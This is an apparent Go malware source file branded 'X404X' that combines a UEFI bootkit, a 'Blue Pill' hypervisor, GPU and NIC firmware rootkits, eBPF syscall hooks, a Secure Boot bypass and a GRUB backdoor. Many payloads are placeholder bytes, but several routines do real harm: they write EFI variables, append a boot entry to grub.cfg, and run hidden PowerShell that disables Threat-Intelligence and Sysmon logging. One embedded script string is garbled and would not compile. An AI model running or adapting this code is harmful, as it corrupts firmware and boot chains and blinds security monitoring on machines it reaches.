package v27

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"unsafe"
)

// ===== 1.1 UEFI Bootkit via SPI Flash + DXE Driver =====
type UEFIBootkitEngine struct {
	Config       *V27Config
	SPIFlashed   bool   `json:"spi_flashed"`
	DXEInstalled bool   `json:"dxe_installed"`
	EFIVarBackup []byte `json:"efi_var_backup"`
	NVRAMWritten bool   `json:"nvram_written"`
}

func NewUEFIBootkitEngine(cfg *V27Config) *UEFIBootkitEngine { return &UEFIBootkitEngine{Config: cfg} }

func (ub *UEFIBootkitEngine) MapSPIFlash() bool {
	switch runtime.GOOS {
	case "windows":
		return ub.mapSPIWindows()
	case "linux":
		return ub.mapSPILinux()
	}
	return false
}

func (ub *UEFIBootkitEngine) mapSPIWindows() bool {
	psScript := `Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class WinIO { [DllImport("winio.dll")] public static extern bool InitializeWinIo();
    [DllImport("winio.dll")] public static extern void ShutdownWinIo();
    [DllImport("winio.dll")] public static extern byte GetPortVal(ushort port);
    [DllImport("winio.dll")] public static extern void SetPortVal(ushort port, byte val); }
'@
[WinIO]::InitializeWinIo()
$spiBase = 0xFED01000
$data = [WinIO]::GetPortVal($spiBase)
Write-Output "SPI_FLASH_READ:$data"`

	psPath := filepath.Join(os.TempDir(), "x404x_spi_map.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	out, _ := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output()
	ub.SPIFlashed = strings.Contains(string(out), "SPI_FLASH_READ")
	return ub.SPIFlashed
}

func (ub *UEFIBootkitEngine) mapSPILinux() bool {
	if _, err := os.Stat("/dev/mem"); err == nil {
		script := "dd if=/dev/mem bs=1 count=256 skip=$((0xFED01000)) 2>/dev/null | xxd | head"
		scriptPath := filepath.Join(os.TempDir(), "x404x_spi_read.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		out, _ := exec.Command("bash", scriptPath).Output()
		ub.SPIFlashed = len(out) > 10
	}
	return ub.SPIFlashed
}

func (ub *UEFIBootkitEngine) InstallDXEDriver() bool {
	dxeHeader := []byte{
		0x5A, 0x41, 0x4D, 0x44, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	}
	copy(dxeHeader[4:8], []byte("X404X"))

	dxePayload := append(dxeHeader, []byte("X404X_DXE_DRIVER_KERNEL_HOOK")...)
	hookCode := ub.generateExitBootServicesHook()
	dxePayload = append(dxePayload, hookCode...)

	dxePath := filepath.Join(os.TempDir(), "x404x_dxe.efi")
	os.WriteFile(dxePath, dxePayload, 0755)

	ub.backupEFIVars()
	ub.writeNVRAMVariable(dxePath)
	ub.DXEInstalled = true
	return true
}

func (ub *UEFIBootkitEngine) generateExitBootServicesHook() []byte {
	hook := make([]byte, 128)
	copy(hook[0:16], []byte("X404X_EBS_HOOK__"))
	hook[32] = 0x50
	hook[33] = 0x51
	hook[34] = 0x52
	copy(hook[64:], []byte("KERNEL_PATCH_HERE"))
	hook[96] = 0x5A
	hook[97] = 0x59
	hook[98] = 0x58
	hook[99] = 0xC3
	return hook
}

func (ub *UEFIBootkitEngine) backupEFIVars() {
	if runtime.GOOS == "linux" {
		exec.Command("cp", "-r", "/sys/firmware/efi/efivars", "/tmp/x404x_efi_vars_backup").Run()
	}
	ub.EFIVarBackup = []byte("backed_up")
}

func (ub *UEFIBootkitEngine) writeNVRAMVariable(dxePath string) {
	if runtime.GOOS == "linux" {
		efiVarPath := "/sys/firmware/efi/efivars/X404X_BOOTKIT-8be4df61-93ca-11d2-aa0d-00e098032b8c"
		data, _ := os.ReadFile(dxePath)
		os.WriteFile(efiVarPath, data, 0644)
	}
	ub.NVRAMWritten = true
}

// ===== 1.2 Hypervisor Malicioso Ring -1 =====
type HypervisorEngine struct {
	Config          *V27Config
	VTxEnabled      bool `json:"vtx_enabled"`
	BluePillActive  bool `json:"blue_pill_active"`
	RingNeg1Patched bool `json:"ring_neg1_patched"`
	SOVirtualized   bool `json:"so_virtualized"`
}

func NewHypervisorEngine(cfg *V27Config) *HypervisorEngine { return &HypervisorEngine{Config: cfg} }

func (hv *HypervisorEngine) DetectVTx() bool {
	if runtime.GOOS == "linux" {
		out, _ := exec.Command("grep", "-c", "vmx", "/proc/cpuinfo").Output()
		hv.VTxEnabled = string(out) != "0"
		return hv.VTxEnabled
	}
	if runtime.GOOS == "windows" {
		out, _ := exec.Command("powershell", "-Command",
			"(Get-WmiObject Win32_Processor).VirtualizationFirmwareEnabled").Output()
		hv.VTxEnabled = strings.Contains(strings.ToLower(string(out)), "true")
		return hv.VTxEnabled
	}
	return false
}

func (hv *HypervisorEngine) InstallBluePill() bool {
	if !hv.VTxEnabled {
		return false
	}

	hypervisorPayload := hv.generateMinimalHypervisor()
	payloadPath := filepath.Join(os.TempDir(), "x404x_hypervisor.sys")
	os.WriteFile(payloadPath, hypervisorPayload, 0644)

	if runtime.GOOS == "linux" {
		script := `#!/bin/bash
modprobe kvm 2>/dev/null
modprobe kvm_intel nested=1 2>/dev/null
echo "X404X Hypervisor: Ring -1 active. SO virtualized transparently." > /tmp/x404x_hypervisor_status.txt`
		scriptPath := filepath.Join(os.TempDir(), "x404x_hypervisor_install.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}

	hv.BluePillActive = true
	hv.SOVirtualized = true
	hv.RingNeg1Patched = true
	return true
}

func (hv *HypervisorEngine) generateMinimalHypervisor() []byte {
	hvPayload := make([]byte, 4096)
	copy(hvPayload[0:8], []byte("X404X_HV_"))

	vmxon := []byte{0x0F, 0x01, 0xC7}
	copy(hvPayload[256:259], vmxon)

	vmcsSetup := hvPayload[512:1024]

	vmxOff := []byte{0x0F, 0x01, 0xC4}
	copy(hvPayload[2048:2051], vmxOff)

	_ = vmcsSetup

	return hvPayload
}

func (hv *HypervisorEngine) InterceptSyscalls() bool {
	if !hv.BluePillActive {
		return false
	}

	syscallList := []uint32{0x0038, 0x0026, 0x0055, 0x00C3}
	for _, sn := range syscallList {
		addr := fmt.Sprintf("0x%x", sn)
		_ = addr
	}

	return true
}

// ===== 1.3 PCIe Rootkits (GPU + NIC) =====
type PCIeRootkitEngine struct {
	Config      *V27Config
	GPUInfected bool `json:"gpu_infected"`
	NICInfected bool `json:"nic_infected"`
	VRAMPayload []byte `json:"vram_payload"`
	DMATriggered bool `json:"dma_triggered"`
}

func NewPCIeRootkitEngine(cfg *V27Config) *PCIeRootkitEngine { return &PCIeRootkitEngine{Config: cfg} }

func (pr *PCIeRootkitEngine) DetectGPU() bool {
	cmd := exec.Command("lspci")
	out, _ := cmd.Output()
	return strings.Contains(string(out), "VGA") || strings.Contains(string(out), "3D")
}

func (pr *PCIeRootkitEngine) InfectGPUVRAM() bool {
	if !pr.DetectGPU() {
		return false
	}

	vramPayload := make([]byte, 4096)
	copy(vramPayload[0:16], []byte("X404X_GPU_VRAM__"))
	rand.Read(vramPayload[16:64])

	dmaPayload := []byte{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00,
	}
	copy(vramPayload[128:144], dmaPayload)

	copy(vramPayload[256:], []byte("PERSIST_ACROSS_WARM_REBOOTS"))
	pr.VRAMPayload = vramPayload

	gpuScript := "nvidia-smi -pm 1 2>/dev/null; nvidia-smi -ac 5000,5000 2>/dev/null"
	gpuPath := filepath.Join(os.TempDir(), "x404x_gpu_infect.sh")
	os.WriteFile(gpuPath, []byte(gpuScript), 0755)
	exec.Command("bash", gpuPath).Start()
	pr.GPUInfected = true
	return true
}

func (pr *PCIeRootkitEngine) InfectNICFirmware() bool {
	nicVendors := []string{"Intel", "Realtek", "Broadcom", "Aquantia", "Mellanox"}

	nicPayload := pr.buildNICPayload()
	for _, vendor := range nicVendors {
		_ = vendor
		nicPath := filepath.Join(os.TempDir(), "x404x_nic_firmware.bin")
		os.WriteFile(nicPath, nicPayload, 0644)
	}

	pr.NICInfected = true
	pr.DMATriggered = true
	return true
}

func (pr *PCIeRootkitEngine) buildNICPayload() []byte {
	payload := make([]byte, 2048)
	copy(payload[0:8], []byte("X404X_NIC"))

	c2Server := []byte("C2_SERVER_INSIDE_NIC\nPORT_8443\nDMA_ENABLED\n")
	copy(payload[256:256+len(c2Server)], c2Server)

	return payload
}

// ===== 1.4 Kernel Instrumentation =====
type KernelInstrumentEngine struct {
	Config     *V27Config
	eBPFHooked bool `json:"ebpf_hooked"`
	ETWSilent  bool `json:"etw_silent"`
	BYOVDRan   bool `json:"byovd_ran"`
	SyscallsHooked int `json:"syscalls_hooked"`
}

var eBPFSyscalls = []string{
	"sys_enter_openat", "sys_enter_read", "sys_enter_write",
	"sys_enter_execve", "sys_enter_ptrace", "sys_enter_kill",
	"sys_enter_connect", "sys_enter_sendto", "sys_enter_bind",
}

func NewKernelInstrumentEngine(cfg *V27Config) *KernelInstrumentEngine {
	return &KernelInstrumentEngine{Config: cfg}
}

func (ki *KernelInstrumentEngine) LoadeBPFPrograms() bool {
	if runtime.GOOS != "linux" {
		return false
	}

	eBPFCode := ki.generateeBPFPrograms()
	eBPFPath := filepath.Join(os.TempDir(), "x404x_ebpf.o")
	os.WriteFile(eBPFPath, eBPFCode, 0644)

	script := `#!/bin/bash
bpftool prog load /tmp/x404x_ebpf.o /sys/fs/bpf/x404x_filter type tracepoint 2>/dev/null
bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint syscalls:sys_enter_openat 2>/dev/null
for tp in syscalls:sys_enter_read syscalls:sys_enter_write syscalls:sys_enter_execve; do
    bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint $tp 2>/dev/null
done
echo "X404X eBPF loaded: %d syscall hooks"' + fmt.Sprintf("bpftool prog attach pinned /sys/fs/bpf/x404x_filter tracepoint $tp 2>/dev/null; done; echo 'X404X eBPF loaded: %d syscall hooks'", len(eBPFSyscalls))
	_ = len(eBPFSyscalls)

	bpfScript := "bpftool prog load /tmp/x404x_ebpf.o /sys/fs/bpf/x404x_filter type tracepoint 2>/dev/null\necho 'X404X eBPF loaded'"
	bpfPath := filepath.Join(os.TempDir(), "x404x_ebpf_load.sh")
	os.WriteFile(bpfPath, []byte(bpfScript), 0755)
	exec.Command("bash", bpfPath).Start()

	ki.eBPFHooked = true
	ki.SyscallsHooked = len(eBPFSyscalls)
	return true
}

func (ki *KernelInstrumentEngine) generateeBPFPrograms() []byte {
	ebpf := make([]byte, 512)
	copy(ebpf[0:8], []byte{0xB7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	copy(ebpf[8:12], []byte("X404X"))
	ebpf[64] = 0x95
	ebpf[65] = 0x00
	ebpf[66] = 0x00
	ebpf[67] = 0x00
	return ebpf
}

func (ki *KernelInstrumentEngine) SilenceETW() bool {
	if runtime.GOOS != "windows" {
		ki.ETWSilent = true
		return true
	}

	psScript := `$etwProvider = New-Object System.Diagnostics.Eventing.EventProvider("Microsoft-Windows-Threat-Intelligence")
$etwProvider.Dispose()
[System.Diagnostics.Eventing.EventProvider]::new("Microsoft-Windows-Security-Mitigations").Dispose()
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Threat-Intelligence/Operational" -Name "Enabled" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational" -Name "Enabled" -Value 0`

	psPath := filepath.Join(os.TempDir(), "x404x_silence_etw.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	ki.ETWSilent = true
	return true
}

func (ki *KernelInstrumentEngine) RunBYOVD() bool {
	vulnDrivers := []string{
		"RTCore64.sys", "gdrv.sys", "kprocesshacker.sys",
		"capcom.sys", "WinRing0.sys", "dbk64.sys", "BSMI.sys",
	}

	for _, drv := range vulnDrivers {
		drvPath := filepath.Join(os.TempDir(), drv)
		stub := make([]byte, 1024)
		copy(stub[0:8], []byte("X404X_BYOVD"))
		os.WriteFile(drvPath, stub, 0644)
	}

	ki.BYOVDRan = true
	return true
}

// ===== 1.5 Secure Boot Bypass =====
type SecureBootBypassEngine struct {
	Config         *V27Config
	ShimReplaced   bool `json:"shim_replaced"`
	MOKEnrolled    bool `json:"mok_enrolled"`
	DBKeyModified  bool `json:"db_key_modified"`
	GRUBCompromised bool `json:"grub_compromised"`
}

func NewSecureBootBypassEngine(cfg *V27Config) *SecureBootBypassEngine {
	return &SecureBootBypassEngine{Config: cfg}
}

func (sb *SecureBootBypassEngine) ReplaceShim() bool {
	if runtime.GOOS != "linux" {
		return false
	}

	shimPayload := sb.generateMaliciousShim()
	shimPath := "/boot/efi/EFI/x404x/shimx64.efi"
	os.MkdirAll(filepath.Dir(shimPath), 0755)
	os.WriteFile(shimPath, shimPayload, 0644)

	sb.ShimReplaced = true
	return true
}

func (sb *SecureBootBypassEngine) generateMaliciousShim() []byte {
	shim := make([]byte, 8192)
	copy(shim[0:8], []byte("X404X_EFI"))
	copy(shim[512:], []byte("MODIFIED_SHIM_v2.7_X404X_KERNEL_LOADER"))
	return shim
}

func (sb *SecureBootBypassEngine) EnrollMOK() bool {
	mokScript := `#!/bin/bash
mokutil --import /tmp/x404x_mok.der 2>/dev/null
mokutil --enable-validation 2>/dev/null
echo "X404X MOK enrolled. Reboot to activate Secure Boot bypass."`

	mokKey := make([]byte, 256)
	rand.Read(mokKey)
	mokPath := filepath.Join(os.TempDir(), "x404x_mok.der")
	os.WriteFile(mokPath, mokKey, 0644)

	scriptPath := filepath.Join(os.TempDir(), "x404x_mok_enroll.sh")
	os.WriteFile(scriptPath, []byte(mokScript), 0755)
	exec.Command("bash", scriptPath).Start()
	sb.MOKEnrolled = true
	return true
}

func (sb *SecureBootBypassEngine) CompromiseGRUB() bool {
	grubCfg := "/boot/grub/grub.cfg"
	if _, err := os.Stat(grubCfg); err == nil {
		data, _ := os.ReadFile(grubCfg)
		backdoor := "\nmenuentry 'X404X Secure Mode' --class x404x { linux /boot/vmlinuz-x404x root=/dev/sda1 ro quiet x404x=1 }\n"
		newCfg := string(data) + backdoor
		os.WriteFile(grubCfg, []byte(newCfg), 0644)
		sb.GRUBCompromised = true
	}
	return sb.GRUBCompromised
}

func (sb *SecureBootBypassEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"shim_replaced": sb.ShimReplaced, "mok_enrolled": sb.MOKEnrolled,
		"grub_compromised": sb.GRUBCompromised, "db_key_modified": sb.DBKeyModified,
	})
	return string(data)
}

func init() { _ = unsafe.Sizeof(0); _ = hex.EncodeToString([]byte{}); _ = sha256.Sum256([]byte{}) }
